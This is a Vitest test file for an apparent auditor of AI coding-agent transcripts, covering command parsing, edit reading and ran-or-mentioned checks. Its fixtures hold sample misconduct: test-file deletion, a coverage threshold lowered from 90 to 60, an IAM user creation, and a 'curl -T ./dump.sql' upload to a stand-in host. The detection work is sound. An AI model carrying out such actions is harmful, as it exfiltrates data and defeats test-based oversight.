// cspell:words multiedit
/**
 * The one reading of a corpus's calls the command checks share (`core/verify/calls.ts`): shell
 * commands and edits from all three apps, in session order, with what each matched, and the
 * ran-or-mentioned split asked of `ran.ts` with a check's own test.
 */

import { describe, expect, it } from "vitest";
import {
  isEdit,
  isShell,
  patchEdits,
  programAndArgs,
  rulesMatcher,
  runStateOf,
  simpleCommands,
} from "../core/verify/calls.js";
import { checkCloud, cloudCard } from "../core/verify/cloud.js";
import { callsOf, OK, SHIPPED } from "./verify-command-fixtures.js";

const RM_TEST = `rm ${"src/a.test.ts"}`;
const holdsRm = (command: string): boolean => /\brm\b/.test(command);

describe("readCalls", () => {
  it("Claude Code: commands and edits, in order, with their results and matches", async () => {
    const { agent, calls } = await callsOf("claude", [
      [
        { kind: "shell", command: "ls", result: OK },
        {
          kind: "edit",
          path: "/p/vitest.config.ts",
          old: "lines: 90",
          new: "lines: 60",
          result: OK,
        },
        { kind: "write", path: "/p/notes.md", content: "hello" },
        { kind: "shell", command: RM_TEST, result: OK },
      ],
    ]);
    expect(agent).toBe("claude");
    expect(calls.map((c) => c.order)).toEqual([0, 1, 2, 3]);
    expect(calls.map((c) => c.cwd)).toEqual(Array(4).fill("/nonexistent/synthetic/project"));
    const [ls, edit, write, rm] = calls;
    expect(ls?.command).toBe("ls");
    expect(edit?.edit).toEqual({
      path: "/p/vitest.config.ts",
      removed: "lines: 90",
      added: "lines: 60",
      whole: false,
      deleted: false,
    });
    expect(write?.edit?.whole).toBe(true);
    expect(write?.result).toBeUndefined();
    expect(rm?.ruleIds).toContain("ti.test-file-delete");
    expect(calls.filter(isShell)).toHaveLength(2);
    expect(calls.filter(isEdit)).toHaveLength(2);
  });

  it("Codex: an apply_patch is one edit per file, and a deletion is marked", async () => {
    const { calls } = await callsOf("codex", [
      [
        { kind: "edit", path: "vitest.config.ts", old: "lines: 90", new: "lines: 60", result: OK },
        { kind: "delete", path: "src/a.test.ts", result: OK },
        { kind: "shell", command: "ls", result: OK },
      ],
    ]);
    expect(calls.map((c) => c.edit?.path ?? c.command)).toEqual([
      "vitest.config.ts",
      "src/a.test.ts",
      "ls",
    ]);
    expect(calls[0]?.edit?.removed).toBe("lines: 90");
    expect(calls[1]?.edit?.deleted).toBe(true);
    // The Codex reader keeps that an output record exists, not its text.
    expect(calls[2]?.result?.content).toBe("");
  });

  it("Cursor: edits are kept by path only, and nothing has a result", async () => {
    const { calls } = await callsOf("cursor", [
      [
        { kind: "edit", path: "/p/vitest.config.ts", old: "a", new: "b" },
        { kind: "delete", path: "/p/a.test.ts" },
      ],
    ]);
    expect(calls.map((c) => c.edit)).toEqual([
      { path: "/p/vitest.config.ts", removed: "", added: "", whole: true, deleted: false },
      { path: "/p/a.test.ts", removed: "", added: "", whole: false, deleted: true },
    ]);
    expect(calls.every((c) => c.result === undefined)).toBe(true);
  });
});

describe("Claude Code edits read from the tool input", () => {
  it("MultiEdit joins its edits; an edit with no path or a tool that edits nothing gives none", async () => {
    const { writeFileSync, mkdtempSync } = await import("node:fs");
    const { tmpdir } = await import("node:os");
    const { join } = await import("node:path");
    const { parseSession } = await import("../core/transcript/parse.js");
    const { createRealScanIO } = await import("../scan-io.js");
    const { readCalls } = await import("../core/verify/calls.js");
    const use = (id: string, name: string, input: Record<string, unknown>) =>
      JSON.stringify({
        type: "assistant",
        uuid: id,
        sessionId: "s",
        cwd: "/p",
        timestamp: "2026-10-01T00:00:00.000Z",
        message: { role: "assistant", content: [{ type: "tool_use", id, name, input }] },
      });
    const file = join(mkdtempSync(join(tmpdir(), "agenttrail-verify-multiedit-")), "s.jsonl");
    writeFileSync(
      file,
      `${[
        use("t1", "MultiEdit", {
          file_path: "/p/vitest.config.ts",
          edits: [
            { old_string: "lines: 90", new_string: "lines: 50" },
            "not an edit",
            { old_string: "branches: 80", new_string: "branches: 40" },
          ],
        }),
        use("t2", "Edit", { old_string: "a", new_string: "b" }),
        use("t3", "Read", { file_path: "/p/a.ts" }),
        use("t4", "MultiEdit", { file_path: "/p/b.ts", edits: "none" }),
      ].join("\n")}\n`,
    );
    const session = await parseSession(file, "s", createRealScanIO());
    const { calls } = readCalls(
      { agent: "claude", sessions: [session], quarantined: 0, notRead: 0, projects: 1 },
      SHIPPED.catalog,
      SHIPPED.allowlist,
    );
    expect(calls.map((c) => c.edit)).toEqual([
      {
        path: "/p/vitest.config.ts",
        removed: "lines: 90\nbranches: 80",
        added: "lines: 50\nbranches: 40",
        whole: false,
        deleted: false,
      },
      undefined,
      undefined,
      { path: "/p/b.ts", removed: "", added: "", whole: false, deleted: false },
    ]);
  });
});

describe("patchEdits", () => {
  it("reads update, add and delete sections, and no marker inside file content", () => {
    const patch = [
      "*** Begin Patch",
      "*** Update File: a.ts",
      "@@",
      "-old",
      "+new",
      "+*** Delete File: not-a-marker",
      "*** Add File: b.ts",
      "+line",
      "*** Delete File: c.ts",
      "*** End Patch",
    ].join("\n");
    expect(patchEdits(patch)).toEqual([
      {
        path: "a.ts",
        removed: "old",
        added: "new\n*** Delete File: not-a-marker",
        whole: false,
        deleted: false,
      },
      { path: "b.ts", removed: "", added: "line", whole: true, deleted: false },
      { path: "c.ts", removed: "", added: "", whole: false, deleted: true },
    ]);
  });
});

describe("patchEdits, the edges", () => {
  it("reads nothing after End Patch, nothing before a marker, and no section with an empty path", () => {
    const patch = [
      "+before any marker",
      "*** Begin Patch",
      "*** Update File:   ",
      "+lost",
      "*** Add File: a.ts\r",
      "+one\r",
      "*** End of File",
      "*** End Patch",
      "+after the end",
    ].join("\n");
    expect(patchEdits(patch)).toEqual([
      { path: "a.ts", removed: "", added: "one", whole: true, deleted: false },
    ]);
  });
});

describe("runStateOf: only a run a recorded result backs counts", () => {
  // A script written and then run in one command: the command ran, but its matched text sits
  // only in the file it wrote, so what that file did is not confirmed.
  const WRITTEN = `cat > x.sh <<EOF\naws iam create-user --user-name ${"zebra"}\nEOF\nbash x.sh`;

  it("a call that may only have run a file it wrote is unknown, never ran", async () => {
    const { agent, calls } = await callsOf("claude", [
      [{ kind: "shell", command: WRITTEN, result: OK }],
    ]);
    expect(runStateOf(agent, calls[0] as never, (c) => c.includes("iam"))).toBe("unknown");
  });

  it("so no check counts it, and the cloud card makes no IAM claim", async () => {
    const calls = await callsOf("claude", [[{ kind: "shell", command: WRITTEN, result: OK }]]);
    const { check } = checkCloud({ calls, ...SHIPPED });
    expect(check.facts).toMatchObject({ iamChanges: 0, unconfirmed: 1 });
    expect(check.status).toBe("could-not-check");
    expect(cloudCard(check, { ranEvidence: "tool-result" }).headline).toBeUndefined();
  });
});

describe("runStateOf: the ran-or-mentioned split, with a check's own test", () => {
  it("a command with a result ran; the same text printed or searched was only mentioned", async () => {
    const { agent, calls } = await callsOf("claude", [
      [
        { kind: "shell", command: RM_TEST, result: OK },
        { kind: "shell", command: `echo "${RM_TEST}"`, result: OK },
        { kind: "shell", command: `grep -rn "${RM_TEST}" docs`, result: OK },
        { kind: "shell", command: RM_TEST },
        { kind: "shell", command: RM_TEST, result: { text: "denied by a hook", isError: true } },
        { kind: "shell", command: RM_TEST, result: { text: "Exit code 1", isError: true } },
      ],
    ]);
    expect(calls.map((c) => runStateOf(agent, c, holdsRm))).toEqual([
      "ran",
      "mentioned",
      "mentioned",
      "unknown",
      "unknown",
      "ran",
    ]);
  });

  it("Cursor never ran; Codex ran on an output record", async () => {
    const cursor = await callsOf("cursor", [[{ kind: "shell", command: RM_TEST }]]);
    expect(runStateOf(cursor.agent, cursor.calls[0] as never, holdsRm)).toBe("unknown");
    const codex = await callsOf("codex", [[{ kind: "shell", command: RM_TEST, result: OK }]]);
    expect(runStateOf(codex.agent, codex.calls[0] as never, holdsRm)).toBe("ran");
  });

  it("an edit ran when its result says so", async () => {
    const { agent, calls } = await callsOf("claude", [
      [
        { kind: "edit", path: "/p/a.ts", old: "a", new: "b", result: OK },
        { kind: "edit", path: "/p/a.ts", old: "a", new: "b" },
      ],
    ]);
    expect(calls.map((c) => runStateOf(agent, c, () => true))).toEqual(["ran", "unknown"]);
  });
});

describe("rulesMatcher", () => {
  it("evaluates only the rules it keeps, on the text it is given", async () => {
    const { calls } = await callsOf("claude", [[{ kind: "shell", command: RM_TEST, result: OK }]]);
    const call = calls[0] as never;
    const testRules = rulesMatcher(SHIPPED.catalog, SHIPPED.allowlist, (r) =>
      r.rule.id.startsWith("ti."),
    );
    const noRules = rulesMatcher(SHIPPED.catalog, SHIPPED.allowlist, () => false);
    expect(testRules(call, RM_TEST)).toBe(true);
    expect(testRules(call, "ls")).toBe(false);
    expect(noRules(call, RM_TEST)).toBe(false);
  });
});

describe("the small readers", () => {
  /** The words of each simple command. */
  const split = (command: string): string[][] =>
    simpleCommands(command).map((simple) => [...simple.words]);

  it("splits a shell text into simple commands, and finds each program past prefixes", () => {
    expect(split("cd a && sudo -E env X=1 npm ci; echo done | tee log")).toEqual([
      ["cd", "a"],
      ["sudo", "-E", "env", "X=1", "npm", "ci"],
      ["echo", "done"],
      ["tee", "log"],
    ]);
    const [only] = simpleCommands("X=1 /usr/bin/Terraform.exe apply");
    expect(only !== undefined && programAndArgs(only)).toEqual({
      program: "terraform",
      args: ["apply"],
      assignments: ["X=1"],
    });
  });

  it.each([
    ["&", `curl -T ./dump.sql "http://localhost:1/?a&b" https://files.example.invalid/up`],
    [";", `curl -T ./dump.sql "http://localhost:1/;b" https://files.example.invalid/up`],
    ["|", `curl -T ./dump.sql 'http://localhost:1/?a|b' https://files.example.invalid/up`],
    [
      "a line break",
      `curl -T ./dump.sql "http://localhost:1/?a\nb" https://files.example.invalid/up`,
    ],
  ])("never splits on %s inside quotes", (_, command) => {
    const commands = split(command);
    expect(commands).toHaveLength(1);
    expect(commands[0]?.at(-1)).toBe("https://files.example.invalid/up");
  });

  it("takes quotes and escapes off whole words, and splits a subshell, a group and a background job", () => {
    expect(split(`ssh host 'cat > x'`)).toEqual([["ssh", "host", "cat > x"]]);
    expect(split(`echo a\\ b "c d"`)).toEqual([["echo", "a b", "c d"]]);
    expect(split("(cd a; make) && { b; } & c")).toEqual([
      ["cd", "a"],
      ["make"],
      ["{", "b"],
      ["}"],
      ["c"],
    ]);
    expect(split("echo $(a; b) # c; d")).toEqual([["echo", "$(a; b)"]]);
  });

  it("reads the commands in a heredoc's body after the command it feeds, one level deep", () => {
    expect(split("bash <<EOF\naws s3 ls\ncat <<'IN'\nrm x\nIN\nEOF\necho done")).toEqual([
      ["bash"],
      ["aws", "s3", "ls"],
      // The heredoc inside the body is not read.
      ["cat"],
      ["echo", "done"],
    ]);
  });

  it("knows where each command's input comes from and what its redirects write", () => {
    const [plain, fromFile, piped] = simpleCommands(
      "cat a > out.txt 2>&1; ssh h x < in.sql; b | c",
    );
    expect(plain).toMatchObject({ writes: ["out.txt"], readsFile: false, pipedIn: false });
    expect(fromFile).toMatchObject({ words: ["ssh", "h", "x"], readsFile: true, pipedIn: false });
    expect(piped).toMatchObject({ words: ["b"], pipedIn: false });
    expect(simpleCommands("b | c")[1]).toMatchObject({ words: ["c"], pipedIn: true });
  });
});
